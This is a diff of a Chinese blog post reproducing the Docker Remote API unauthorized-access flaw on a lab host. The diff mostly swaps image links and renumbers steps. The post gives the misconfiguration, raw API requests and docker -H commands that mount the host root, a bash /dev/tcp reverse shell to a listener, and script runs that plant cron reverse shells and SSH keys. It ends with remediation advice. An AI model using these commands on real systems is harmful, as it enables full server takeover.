@@ -7,6 +7,14 @@ categories: ['漏洞复现']
 ---
 复现未授权漏洞系列
 <!--more-->
+---
+title: "docker Remote API 未授权访问"
+date: 2019-10-20T11:24:15+08:00
+draft: false
+tags: ['未授权访问']
+categories: ['漏洞复现']
+---
+
 # 漏洞详情：
 
 Docker 是一个开源的引擎可以轻松地为任何应用创建一个轻量级的、可移植的、自给自足的容器。开发者在笔记本上编译测试通过的容器可以批量地在生产环境中部署包括 VMs、bare metal、OpenStack 集群和其他的基础应用平台Docker。
@@ -41,14 +49,14 @@ sudo systemctl start docker
 docker run hello-world
 ```
 完成图：
-![图片](https://uploader.shimo.im/f/NJbsniwB0bQmhKJy.png!thumbnail)
+![1.jpg](https://ae01.alicdn.com/kf/Uabb53632bc794b51a6b550d5059c18cch.jpg)
 
 ## 修改配置文件：
 ```
 vi  /lib/systemd/system/docker.service
 ```
 修改dockerd启动参数，使其绑定在0.0.0.0上，导致未授权任意访问。
-![图片](https://uploader.shimo.im/f/9FoF7SNhfII01XHb.png!thumbnail)
+![2.jpg](https://ae01.alicdn.com/kf/U5edded7756114b76ad3864f138d3105as.jpg)
 
 然后执行：
 
@@ -62,7 +70,7 @@ systemctl restart docker.service     //重启docker服务
 curl "http://127.0.0.1:2375/v1.25/info"
 ```
 测试截图：
-![图片](https://uploader.shimo.im/f/Kwu17i9YtoEf4V87.png!thumbnail)
+![3.jpg](https://ae01.alicdn.com/kf/Uc47f3c990f3a4ef183d7a19aa06a9d48J.jpg)
 
 **此处是为了复现此漏洞，所以这么修改。真实生产环境一定不要这么该配置！！！！**
 
@@ -76,7 +84,7 @@ docker pull ubuntu:18.04
 docker run -d ubuntu:18.04 /bin/bash -c 'while true; do sleep 1; done'
 ```
 参考：
-![图片](https://uploader.shimo.im/f/Cbv6Tb1Ax6QJZ49f.png!thumbnail)
+![4.jpg](https://ae01.alicdn.com/kf/Udc44d80c68cf4b2d8fe38a972bb191d9e.jpg)
 
 # 漏洞复现：
 ## 浏览器直接访问：
@@ -84,27 +92,24 @@ docker run -d ubuntu:18.04 /bin/bash -c 'while true; do sleep 1; done'
 
 [http://172.26.1.97:2375/info](http://172.26.1.97:2375/info)
 
-![图片](https://uploader.shimo.im/f/Ff56QOZ5AoIo1Bvf.png!thumbnail)
+![5.jpg](https://ae01.alicdn.com/kf/Ueb6f622706f448dd8dd6fea1f03de2803.jpg)
 
 2. 获取image列表：
 
 [http://172.26.1.97:2375/images/json](http://172.26.1.97:2375/v1.25/images/json)
 
-![图片](https://uploader.shimo.im/f/nh0XngoZAL06Ir8k.png!thumbnail)
+![6.jpg](https://ae01.alicdn.com/kf/U0a1a57e6d75941b0b31b2888cf048a71t.jpg)
 
-浏览器装了JSON-handle插件后访问：
 
-![图片](https://uploader.shimo.im/f/NqY7NGJHVuE090sy.png!thumbnail)
 
-json格式的数据就显示的很美观了
-
-1. 获取容器信息：
+3. 获取容器信息：
 
 [http://172.26.1.97:2375/containers/json](http://172.26.1.97:2375/containers/json)
 
-![图片](https://uploader.shimo.im/f/Hl4vSSKGW4AXsKIl.png!thumbnail)
+![7.jpg](https://ae01.alicdn.com/kf/Uf6ff65134f7c4167b8870f3e87040c2eE.jpg)
 
-1. 设置免登陆，获取服务器权限（当然得root权限启动docker）
+
+4. 设置免登陆，获取服务器权限（当然得root权限启动docker）
 
 原理：
 
@@ -133,16 +138,19 @@ Postman-Token: 7abe8d48-2e9d-4245-a7a4-dbd66279705e
 }------WebKitFormBoundary7MA4YWxkTrZu0gW-- 
 ```
 创建成功：
-![图片](https://uploader.shimo.im/f/rScEvhnqpssohbTK.png!thumbnail)
+![8.jpg](https://ae01.alicdn.com/kf/U601ca3765d9948b881d416ad2db51de8t.jpg)
 
 返回了 containers ID
 
 ```
 {"Id":"28f2c8024538b93ed26a7ffadf9bce86b0361139947e8fb71767d2fa0d3e2b79","Warnings":[]}
 ```
-2）获取container的信息检查一下是否有问题，这一步可以略过：![图片](https://uploader.shimo.im/f/i5xcBNTwj0MmKK4g.png!thumbnail)
+2）获取container的信息检查一下是否有问题，这一步可以略过：
+![9.jpg](https://ae01.alicdn.com/kf/Ude68ad19c7a14ec99a3f8c9bb58a608aP.jpg)
 
-（3） 定是要先attach，再start，这样就可以捕获到输出:
+3）定是要先attach，再start，这样就可以捕获到输出:
+
+attach包：
 
 ```
 POST /v1.17/containers/bcd44e3731cc11cd0afe93445fd2e8ee9b0a34e7c39018920320b88fa6acd57b/attach?stderr=1&stdin=1&stdout=1&stream=1 HTTP/1.1
@@ -170,42 +178,44 @@ Accept-Encoding: gzip
 docker -H tcp://172.26.1.97:2375 version
 ```
 查看其docker版本信息：
-![图片](https://uploader.shimo.im/f/teVVhVPcElAoLaso.png!thumbnail)
+![10.jpg](https://ae01.alicdn.com/kf/U0df2781528ef497588479d2d8a4b30ade.jpg)
 
-1. 查看目标机器的镜像：
+2. 查看目标机器的镜像：
+
 ```
 docker -H tcp://172.26.1.97:2375 images
 ```
 截图：
-![图片](https://uploader.shimo.im/f/FV8EV5NMq04itTzu.png!thumbnail)
+![11.jpg](https://ae01.alicdn.com/kf/U32623262ed63424282d7f194bc01cb1bM.jpg)
 
-1. 查看目标机器的容器：
+3. 查看目标机器的容器：
+
 ```
 docker -H tcp://172.26.1.97:2375 ps
 ```
 截图：
-![图片](https://uploader.shimo.im/f/Ob1J5jUKvSQn4mtz.png!thumbnail)
+
+![1.jpg](https://ae01.alicdn.com/kf/Uba9d196291f44c99bc37d8c1d2008fc9p.jpg)
 
 start 启动一个已经停止的容器
 
 attach 连接一个已经停止的容器
 
-1. 新运行一个容器并将entrypoint设置为/bin/bash或者/bin/sh，挂载点设置为服务器的根目录挂载至/tmp目录下（需要root权限启动docker）
+4. 新运行一个容器并将entrypoint设置为/bin/bash或者/bin/sh，挂载点设置为服务器的根目录挂载至/tmp目录下（需要root权限启动docker）
+
 ```
 docker -H tcp://172.26.1.97:2375 run -it -v /:/tmp --entrypoint /bin/sh ubuntu:18.04
 ```
 截图：
-![图片](https://uploader.shimo.im/f/HHNXBVSAoR8R20IJ.png!thumbnail)
+![12.jpg](https://ae01.alicdn.com/kf/Uba3fd4312fe14205afff8c2f0c82df32y.jpg)
 
 尝试连接：
-
-![图片](https://uploader.shimo.im/f/w91oCsUSjoUrjRIk.png!thumbnail)
+![13.jpg](https://ae01.alicdn.com/kf/Ue49efbdf519d42ff9efebbcb3d0e8231g.jpg)
 
 当然我们也可以进行其他操作，linux下反弹shell的方法都可以试试
 
 当目标机器的容器中有bash我们可以直接将entrypoint设置为/bin/bash
-
-![图片](https://uploader.shimo.im/f/pI1wUuwVlZII6kd1.png!thumbnail)
+![14.jpg](https://ae01.alicdn.com/kf/Uecd9a07cb770454e9177ceb8f5de78f2J.jpg)
 
 反弹shell：
 
@@ -213,7 +223,9 @@ docker -H tcp://172.26.1.97:2375 run -it -v /:/tmp --entrypoint /bin/sh ubuntu:1
 bash -i >& /dev/tcp/172.26.1.156/6666 0>&1
 ```
 接收shell：
-![图片](https://uploader.shimo.im/f/dzCoBNzigWYQHjn0.png!thumbnail)
+![15.jpg](https://ae01.alicdn.com/kf/U7b8e78e557b042b5b0d79b2df32fe564o.jpg)
+
+
 
 ### 可以使用的命令：
 ```
@@ -265,72 +277,77 @@ Commands:
 py -2 dockerRemoteApiGetRootShell.py -h 172.26.1.97 -p 2375
 ```
 截图:
-![图片](https://uploader.shimo.im/f/rvjQ6CHuzckK75Sk.png!thumbnail)
+![16.jpg](https://ae01.alicdn.com/kf/Uf9c0a1658ad14b04b0c3c4c9c94c3b18P.jpg)
 
-1. 查看所有的容器:
+2. 查看所有的容器:
+
 ```
 py -2 dockerRemoteApiGetRootShell.py -h 172.26.1.97 -p 2375 -a
 ```
 截图：
-![图片](https://uploader.shimo.im/f/fc5q0dDF9rgKW41K.png!thumbnail)
+![17.jpg](https://ae01.alicdn.com/kf/Uddc8fa961ffa4ae9a034c0547b0f6f17W.jpg)
 
-1. 查看所有镜像：
+3. 查看所有镜像：
+
 ```
 py -2 dockerRemoteApiGetRootShell.py -h 172.26.1.97 -p 2375 -l
 ```
 截图：
-![图片](https://uploader.shimo.im/f/uG0wpiXhe5ACEZoH.png!thumbnail)
+![18.jpg](https://ae01.alicdn.com/kf/Ucafb5443dc5544578c5b6fc117d7e624y.jpg)
 
-1. 查看端口映射：
+4. 查看端口映射：
+
 ```
 py -2 dockerRemoteApiGetRootShell.py -h 172.26.1.97 -p 2375 -L
 ```
 截图：
-![图片](https://uploader.shimo.im/f/BqkPocBnCMsuxNjc.png!thumbnail)
+![19.jpg](https://ae01.alicdn.com/kf/Ue6d374a459ec492b805ef7f187002ea4L.jpg)
 
 我这里启动的docker并未映射端口，所以返回空白！
 
-1. 利用脚本写定时任务反弹shell：
+5. 利用脚本写定时任务反弹shell：
+
 ```
 py -2 dockerRemoteApiGetRootShell.py -h 172.26.1.97 -p 2375 -C -i ubuntu:18.04 -H 172.26.1.156 -P 6666
 ```
 截图：
-![图片](https://uploader.shimo.im/f/0Q9U5gcB6ncRN2g9.png!thumbnail)
+![20.jpg](https://ae01.alicdn.com/kf/Ue4ba7df9c7644ce58809a55c254c2b9ev.jpg)
 
-1. 利用脚本写ssh公钥：
+6. 利用脚本写ssh公钥：
 
 编辑脚本
 
-![图片](https://uploader.shimo.im/f/IJQ6pdCUeQUcZOlz.png!thumbnail)
+![21.jpg](https://ae01.alicdn.com/kf/Uf30a7ed52d0c4151b02a5dcc2da5c6abP.jpg)
 
 执行脚本：
 
-![图片](https://uploader.shimo.im/f/XKHMirOuvqIve1Rr.png!thumbnail)
+![22.jpg](https://ae01.alicdn.com/kf/U296d3c4f18544ffe9b2bd40d5fc85a55l.jpg)
 
 登录截图：
 
-![图片](https://uploader.shimo.im/f/5dHIZMtlGsYgQmHD.png!thumbnail)
+![23.jpg](https://ae01.alicdn.com/kf/Ud3b3fa4e60474215811e380f480b2aa1z.jpg)
 
-1. 在容器中执行命令
+7. 在容器中执行命令
 
 先获取到容器id：
 
-![图片](https://uploader.shimo.im/f/GhyfkwDcw7A6vueR.png!thumbnail)
+![24.jpg](https://ae01.alicdn.com/kf/U2f574c3652a04e5192129371e206364ap.jpg)
 
 然后选取一个容器（需要容器为up状态）进行执行命令：
 
-![图片](https://uploader.shimo.im/f/B4mYwamX1Sk5lvEo.png!thumbnail)
+![25.jpg](https://ae01.alicdn.com/kf/Ucd92b54b539d49939c7b20eaf9a6a6b69.jpg)
 
-1. 删除容器：
+8. 删除容器：
+
 ```
 py -2 dockerRemoteApiGetRootShell.py -h 172.26.1.97 -p 2375 -c -I a08a888cf9de10f4e5715f4fbf12b0c303b66c5929040cb2029d62b92cc68c4c
 ```
 截图：
-![图片](https://uploader.shimo.im/f/1h7CjsSpM30NmdMF.png!thumbnail)
+![26.jpg](https://ae01.alicdn.com/kf/Ufa99293b893b4b8082203929ff54e5c28.jpg)
 
-1. 查看服务端api版本：
+9. 查看服务端api版本：
 
-![图片](https://uploader.shimo.im/f/XNFJpUOOaDQl5CeQ.png!thumbnail)
+![27.jpg](https://ae01.alicdn.com/kf/U86c9091bf51c4f538f01bb79de2fa5b1i.jpg)
 
 # 漏洞修复：
 1. 简单粗暴的方法，对2375端口做网络访问控制，如ACL控制，或者访问规则。
@@ -343,4 +360,6 @@ py -2 dockerRemoteApiGetRootShell.py -h 172.26.1.97 -p 2375 -c -I a08a888cf9de10
 [http://www.anquan.us/static/bugs/wooyun-2016-0209856.html](http://www.anquan.us/static/bugs/wooyun-2016-0209856.html)
 
 [https://github.com/Tycx2ry/docker_api_vul](https://github.com/Tycx2ry/docker_api_vul)
+
+
 
